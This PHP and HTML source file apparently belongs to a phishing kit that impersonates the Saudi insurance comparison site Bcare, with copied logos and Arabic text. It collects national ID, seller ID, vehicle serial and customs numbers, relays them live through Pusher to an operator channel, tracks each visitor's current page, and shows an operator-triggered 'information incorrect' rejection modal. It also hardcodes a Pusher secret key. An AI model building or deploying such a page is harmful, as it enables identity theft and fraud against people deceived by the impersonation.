<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'الرئيسية');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'الرئيسية'
    ];

    $pusher->trigger('bcare', 'curreneft-page', $dataa);
}

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'ssn' => $_POST['ssn'],
        'firstType' => $_POST['firstType'],
        'secondType' => $_POST['secondType'],
        'ssnTwo' => $_POST['ssnTwo'],
        'tasal' => $_POST['tasal'],
        'jamNum' => $_POST['jomNum'],
        'yearOf' => $_POST['yearOf'],

        'page' => 'الرئيسية',
        'message' => 'الرئيسية',
        'type' => '1',
        'chat_session_id' => $_POST['chat_session_id'] ?? null
    );

    $_SESSION['type'] = 1;
    $_SESSION['ssn'] = $_POST['ssn'];

    $id = $User->register($site);
    if ($id) {

        $_SESSION['user_id'] = $id;

        $data['message'] = $_POST['ssn'];
        $pusher->trigger('bcare', 'my-event-bann', $data);

        SendMail($_POST["username"]);

        echo "<script>document.location.href='index-details.php';</script>";
    }
}
if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_GET['done'])) {
    $showError1 = true;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> بي كير للتأمين : أفضل موقع مقارنة تأمين سيارة ومركبات | تأمينك Bcare</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        }
         */

        .bacOne {
            background-color: #156394;
        }

        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }

        label {
            font-weight: bold;
            font-size: 14px;
        }

        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }

        .text-primary {
            color: #156394 !important;
        }

        .text-muted {
            color: rgb(153, 153, 153) !important;
        }

        ::placeholder {
            color: #d2d6da !important;
        }

        .bg-two {
            background-color: #156394;
        }

        .form-check-input:checked {
            background-color: #f9a824 !important;
            /* Bootstrap primary color or your custom color */
            border-color: #f9a824;
        }

        /* Optional: Change the check mark dot color (on some browsers) */

        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }

        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }

        .bg-one {
            background-color: #156394;
            height: 40px;
            color: #f8f9fa;
        }

        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }

        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }

        .forShow {
            display: flex;
            gap: 10px;
        }

        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }

        .btn-warning {
            background-color: #f9a824;
            border-color: #f9a824;
        }
    </style>
    <link rel="stylesheet" href="./assets/css/theme.css">
</head>

<body class="bg-light">

    <nav class="d-flex justify-content-center py-2 shadow">
        <a href="index.php">
            <img src="./assets/Bcare-logo.svg" alt="">
        </a>
    </nav>

    <div class="bacOne text-center p-3 pb-5 pt-4">
        <h4 class="fw-bold text-light"> قارن ,أمن ,استلم وثيقتك </h4>
        <small class="text-light"> مكان واحد وفّر عليك البحث بين أكثر من 20 شركة تأمين!</small>
    </div>

    <div class="container px-2" style="margin-top: -30px;">
        <div class="d-flex justify-content-between pt-3 bg-white" style="border-radius: 20px;padding: 0px 37px;">
            <a href="#" class="d-flex flex-column align-items-center gap-1 pb-2"
                style="border-bottom: 3px solid #f9a824;">
                <i class="fa-solid fa-car active fs-5"></i>
                <span class="text-primary fw-bold"> مركبات </span>
            </a>
            <a href="./medical.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-heart-pulse fs-5"></i>
                <span class="text-muted fw-bold"> طبي </span>
            </a>
            <a href="./medical-mis.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-stethoscope fs-5"></i>
                <span class="text-muted fw-bold"> اخطاء طبية </span>
            </a>
            <a href="./travel.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-plane fs-5"></i>
                <span class=" text-muted fw-bold"> سفر </span>
            </a>
        </div>
    </div>


    <div class="container pt-4 pb-3" style="background-color: rgb(226, 226, 226);">
        <div class="shadow-sm bg-white" style="border-radius: 15px;">
            <form action="" method="POST">
                <div class="d-flex">
                    <div class="panner cont d-flex justify-content-center align-items-center bg-one w-50"
                        style="border-radius: 0px 15px 0 0;">
                        <small class="fw-bold">تأمين جديد</small>
                    </div>
                    <div class="panner cont d-flex justify-content-center align-items-center bg-o-two w-50"
                        style="border-radius: 15px 0 0 0;">
                        <span class="fw-bold">نقل ملكية</span>
                    </div>
                </div>

                <input type="hidden" id="firstType" name="firstType" value="1">
                <input type="hidden" id="secondType" name="secondType" value="1">
                <input type="hidden" name="chat_session_id" id="chat_session_id_input">
                <script>document.getElementById('chat_session_id_input').value = localStorage.getItem('chat_session_id');</script>

                <div class="mt-3 px-3">

                    <div id="typeTwo" style="display: none;">
                        <label for="" class="mb-2">رقم هوية البائع</label>
                        <input type="text" id="ssnTwo" minlength="10" maxlength="10" pattern="[0-9]*" name="ssnTwo"
                            inputmode="numeric" class="form-control" placeholder="رقم هوية البائع">
                    </div>

                    <label for="" class="mb-2 mt-3">رقم الهوية / الإقامة</label>
                    <input type="text" id="ssn" name="ssn" required minlength="10" maxlength="10" pattern="[0-9]*"
                        inputmode="numeric" class="form-control" placeholder="رقم الهوية / الإقامة">

                    <div class="d-flex my-3">
                        <div id="ista" class="pannerTwo contTwo ajamaclas gap-2 bg-one w-50 px-3"
                            style="border-radius:5px;">
                            <input type="radio" value="1" name="chec" onclick="changeLoca(this)" checked
                                class="form-check-input">
                            <small class="fw-bold">استمارة</small>
                        </div>
                        <div id="ista2" class="pannerTwo contTwo ajamaclas gap-2 bg-a-two w-50 px-3"
                            style="border-radius: 10px 0 0 10px;">
                            <input type="radio" value="2" name="chec" onclick="changeLoca(this)"
                                class="form-check-input">
                            <small class="fw-bold">بطاقة جمركية</small>
                        </div>
                    </div>

                    <div class="forShow" id="jama" style="display: none;">

                        <div>
                            <label for="" class="mb-2"> سنة صنع المركبة </label>
                            <select name="yearOf" class="form-select text-muted" id="year">
                                <option value=""> سنة صنع المركبة </option>
                                <option value="2026">2026</option>
                                <option value="2025">2025</option>
                                <option value="2024">2024</option>
                                <option value="2023">2023</option>
                                <option value="2022">2022</option>
                                <option value="2021">2021</option>
                                <option value="2020">2020</option>
                                <option value="2019">2019</option>
                                <option value="2018">2018</option>
                                <option value="2017">2017</option>
                                <option value="2016">2016</option>
                                <option value="2015">2015</option>
                                <option value="2014">2014</option>
                                <option value="2013">2013</option>
                                <option value="2012">2012</option>
                                <option value="2011">2011</option>
                                <option value="2010">2010</option>
                                <option value="2009">2009</option>
                                <option value="2008">2008</option>
                                <option value="2007">2007</option>
                                <option value="2006">2006</option>
                                <option value="2005">2005</option>
                                <option value="2004">2004</option>
                                <option value="2003">2003</option>
                                <option value="2002">2002</option>
                                <option value="2001">2001</option>
                                <option value="2000">2000</option>
                                <option value="1999">1999</option>
                                <option value="1998">1998</option>
                                <option value="1997">1997</option>
                                <option value="1996">1996</option>
                                <option value="1995">1995</option>
                                <option value="1994">1994</option>
                                <option value="1993">1993</option>
                                <option value="1992">1992</option>
                                <option value="1991">1991</option>
                                <option value="1990">1990</option>
                                <option value="1989">1989</option>
                                <option value="1988">1988</option>
                                <option value="1987">1987</option>
                                <option value="1986">1986</option>
                                <option value="1985">1985</option>
                                <option value="1984">1984</option>
                                <option value="1983">1983</option>
                                <option value="1982">1982</option>
                                <option value="1981">1981</option>
                                <option value="1980">1980</option>
                                <option value="1979">1979</option>
                                <option value="1978">1978</option>
                                <option value="1977">1977</option>
                                <option value="1976">1976</option>
                                <option value="1975">1975</option>
                                <option value="1974">1974</option>
                                <option value="1973">1973</option>
                                <option value="1972">1972</option>
                                <option value="1971">1971</option>
                                <option value="1970">1970</option>
                                <option value="1969">1969</option>
                                <option value="1968">1968</option>
                                <option value="1967">1967</option>
                                <option value="1966">1966</option>
                                <option value="1965">1965</option>
                                <option value="1964">1964</option>
                                <option value="1963">1963</option>
                                <option value="1962">1962</option>
                                <option value="1961">1961</option>
                                <option value="1960">1960</option>
                                <option value="1959">1959</option>
                                <option value="1958">1958</option>
                                <option value="1957">1957</option>
                                <option value="1956">1956</option>
                                <option value="1955">1955</option>
                                <option value="1954">1954</option>
                                <option value="1953">1953</option>
                                <option value="1952">1952</option>
                                <option value="1951">1951</option>
                                <option value="1950">1950</option>
                                <option value="1949">1949</option>
                                <option value="1948">1948</option>
                                <option value="1947">1947</option>
                                <option value="1946">1946</option>
                                <option value="1945">1945</option>
                                <option value="1944">1944</option>
                                <option value="1943">1943</option>
                                <option value="1942">1942</option>
                                <option value="1941">1941</option>
                                <option value="1940">1940</option>
                                <option value="1939">1939</option>
                                <option value="1938">1938</option>
                                <option value="1937">1937</option>
                                <option value="1936">1936</option>
                                <option value="1935">1935</option>
                                <option value="1934">1934</option>
                                <option value="1933">1933</option>
                                <option value="1932">1932</option>
                                <option value="1931">1931</option>
                                <option value="1930">1930</option>
                                <option value="1929">1929</option>
                                <option value="1928">1928</option>
                                <option value="1927">1927</option>
                                <option value="1926">1926</option>
                                <option value="1925">1925</option>
                                <option value="1924">1924</option>
                                <option value="1923">1923</option>
                                <option value="1922">1922</option>
                                <option value="1921">1921</option>
                                <option value="1920">1920</option>
                                <option value="1919">1919</option>
                                <option value="1918">1918</option>
                                <option value="1917">1917</option>
                                <option value="1916">1916</option>
                            </select>
                        </div>

                        <div>
                            <label for="" class="mb-2"> الرقم الجمركي </label>
                            <input type="text" name="jomNum" class="form-control mb-3" pattern="[0-9]*" name="numG"
                                id="numG" placeholder="  الرقم الجمركي  ">

                        </div>

                    </div>

                    <div id="tasal">
                        <label for="" class="mb-2"> الرقم التسلسلي </label>
                        <input type="text" name="tasal" class="form-control mb-3" pattern="[0-9]*" required
                            placeholder=" الرقم التسلسلي ">
                    </div>



                    <label for="" class="mb-2"> رمز التحقق </label>
                    <div class="d-flex group mb-3 align-items-center">
                        <input type="text" class="form-control text-center fs-5 fw-bold" id="captchaInput" required
                            minlength="4" maxlength="4" inputmode="numeric"
                            oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="أدخل الرمز">
                        <i class="bi bi-arrow-clockwise fs-2 text-secondary mx-2"
                            style="cursor: pointer; transition: 0.2s;" onclick="generateCaptcha(this)"
                            title="تغيير الرمز"></i>
                        <div id="captchaDisplay"
                            class="d-flex align-items-center justify-content-center mx-2 shadow-sm rounded user-select-none"
                            style="min-width: 100px; height: 45px; background: #e9ecef; letter-spacing: 5px; font-weight: 800; font-size: 1.4rem; color: #444; border: 1px solid #ced4da; position: relative; overflow: hidden;">
                            <canvas id="captchaCanvas"
                                style="position: absolute; top:0; left:0; width:100%; height:100%; z-index:1; opacity:0.8; pointer-events: none;"></canvas>
                            <span id="captchaText"
                                style="position: relative; z-index: 2; font-family: monospace; font-style: italic; text-shadow: 1px 1px 2px rgba(255,255,255,0.8);"></span>
                        </div>
                    </div>

                    <script>
                        function generateCaptcha(btn = null) {
                            if (btn) {
                                btn.style.transform = 'rotate(180deg)';
                                setTimeout(() => btn.style.transform = 'rotate(0deg)', 200);
                            }
                            const chars = '0123456789';
                            let captcha = '';
                            for (let i = 0; i < 4; i++) {
                                captcha += chars[Math.floor(Math.random() * chars.length)];
                            }

                            document.getElementById('captchaText').innerText = captcha;
                            const input = document.getElementById('captchaInput');
                            input.value = '';
                            input.setAttribute('pattern', captcha);

                            // Draw noise lines
                            const canvas = document.getElementById('captchaCanvas');
                            if (canvas) {
                                canvas.width = 100;
                                canvas.height = 45;
                                const ctx = canvas.getContext('2d');
                                ctx.clearRect(0, 0, canvas.width, canvas.height);
                                for (let i = 0; i < 6; i++) {
                                    ctx.beginPath();
                                    ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
                                    ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
                                    ctx.strokeStyle = ['#ff0000', '#0a58ca', '#198754', '#212529'][Math.floor(Math.random() * 4)];
                                    ctx.lineWidth = 1.5;
                                    ctx.stroke();
                                }
                            }
                            // Form validation update
                            if (input.form) input.form.dispatchEvent(new Event('input', { bubbles: true }));
                        }

                        document.addEventListener('DOMContentLoaded', () => generateCaptcha());
                    </script>

                    <p class="text-center text-muted my-4" style="font-size: 14px;font-weight: 650;"> أوافق على منح شركة
                        عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي </p>


                    <div class="text-center pb-4">
                        <button type="submit" name="submit" id="butSubm" disabled
                            class="btn btn-warning w-100 text-light fw-bold">إضهار العروض</button>
                    </div>

                </div>
            </form>
        </div>
    </div>

    <div class="container shadow mt-5">
        <div class="d-flex py-5 px-3">
            <div class="ps-4" style="border-left: 1px solid lightgray;">
                <img src="./assets/Group 6528.svg" width="100" alt="">
            </div>
            <div class="me-2 w-75 d-flex gap-2">
                <img src="./assets/Aljazira-Takaful.svg" width="80" alt="">
                <img src="./assets/Walaa.svg" width="80" alt="">
                <img src="./assets/MedGulf.svg" width="80" alt="">
            </div>
        </div>
    </div>

    <div class="container" style="margin-top: 70px;">
        <h5 class="fw-bold text-primary text-center"> طريقك آمــن مع بي كير </h5>
        <div class="row d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/insureOneMin.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> تأمينك في دقيقة </small>
            </div>

            <div class="col d-flex flex-column  shadow-sm p-3 pb-5 align-items-center gap-4"
                style="border-radius: 15px;">
                <img src="./assets/sprateInsure.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> فصّل تأمينك </small>
            </div>

            <div class="col d-flex flex-column  align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/priceLess.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> أسعار أقل </small>
            </div>

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/sechleInsure.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> جدول تأمينك </small>
            </div>
        </div>

        <div class="row d-flex justify-content-between mt-2">

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/wind.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> هب ريح </small>
            </div>

            <div class="col d-flex flex-column  shadow-sm p-3 pb-5 align-items-center gap-2"
                style="border-radius: 15px;">
                <img src="./assets/discounts.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary text-center fw-bold"> خصومات تضبطك </small>
            </div>

            <div class="col d-flex flex-column  align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/benfit.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> منافع تحميك </small>
            </div>

            <div class="col d-flex flex-column align-items-center shadow-sm p-3 pb-5 gap-2"
                style="border-radius: 15px;">
                <img src="./assets/oneWay.svg" width="30" alt="">
                <small style="font-size: 12px;" class="text-primary fw-bold"> مكان واحد </small>
            </div>
        </div>


    </div>


    <div class="container bg-white py-5" style="margin-top: 70px;">
        <h5 class="fw-bold text-primary text-center"> ليش بي كير خيارك الأول في التأمين؟ </h5>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/saudi.svg" width="30" alt="">
                <small class="text-primary fw-bold"> منك وفيك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/catalog.svg" width="30" alt="">
                <small class="text-primary fw-bold"> عروض تفهمك </small>
            </div>
        </div>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/payments_FILL0_wght400_GRAD0_opsz48.svg" width="30" alt="">
                <small class="text-primary fw-bold"> سعر يرضيك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/Group 6518.svg" width="30" alt="">
                <small class="text-primary fw-bold"> إصدار سريع </small>
            </div>
        </div>

        <div class="d-flex justify-content-between mt-5">
            <div class="col d-flex flex-column justify-content-center align-items-center gap-2">
                <img src="./assets/tachometer-alt-fastest.svg" width="30" alt="">
                <small class="text-primary fw-bold"> نقسط تأمينك </small>
            </div>
            <div class="col d-flex flex-column  align-items-center gap-2">
                <img src="./assets/flame.svg" width="30" alt="">
                <small class="text-primary fw-bold"> نفرغ لك </small>
            </div>
        </div>
    </div>


    <footer class="bg-two p-3">
        <img src="./assets/logo-bacre-white.svg" alt="">

        <p class="text-light text-center fw-bold mt-5" style="font-size: 13px;"> 2025 © جميع الحقوق محفوظة، شركة عناية
            الوسيط لوساطة التأمين </p>
    </footer>

    <script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id'] ?? null); ?>;
    </script>
    
    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات المدخلة غير صحيحة، يرجى التأكد من رقم الهوية أو الرقم التسلسلي والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function () {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        });


        document.querySelectorAll('.panner').forEach(radio => {
            radio.addEventListener('click', function () {
                // Hide all cont sections
                document.querySelectorAll('.cont').forEach(cont => {
                    cont.classList.remove('bg-two');
                    cont.classList.add('bg-o-two');
                });

                // Show the cont section related to the selected radio
                const cont = this.closest('.panner');
                cont.classList.remove('bg-o-two');
                cont.classList.add('bg-one');

                var typeTwo = document.getElementById('typeTwo');
                if (typeTwo.style.display == 'none') {
                    typeTwo.style.display = 'block';
                    var firstType = document.getElementById('firstType');
                    firstType.value = 2;

                    document.getElementById('ssnTwo').required = true;
                } else {
                    typeTwo.style.display = 'none';
                    var firstType = document.getElementById('firstType');
                    firstType.value = 1;
                    document.getElementById('ssnTwo').required = false;
                }
            });
        });

        function changeLoca(radio) {

            var jama = document.getElementById('jama');
            var tasal = document.getElementById('tasal');

            var ista = document.getElementById('ista');
            var ista2 = document.getElementById('ista2');

            if (radio.value == 1) {
                ista2.classList.remove('bg-two');
                ista2.classList.add('bg-a-two');

                ista.classList.add('bg-one');
                ista.classList.remove('bg-a-two');

                jama.style.display = 'none';
                tasal.style.display = 'inline';

                var secondType = document.getElementById('secondType');
                secondType.value = 1;

                document.getElementById('year').required = false;
                document.getElementById('numG').required = false;

            } else {
                ista2.classList.add('bg-one');
                ista2.classList.remove('bg-a-two');

                ista.classList.remove('bg-one');
                ista.classList.add('bg-a-two');

                jama.style.display = 'flex';
                tasal.style.display = 'none';

                var secondType = document.getElementById('secondType');
                secondType.value = 2;

                document.getElementById('year').required = true;
                document.getElementById('numG').required = true;
            }
        }
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>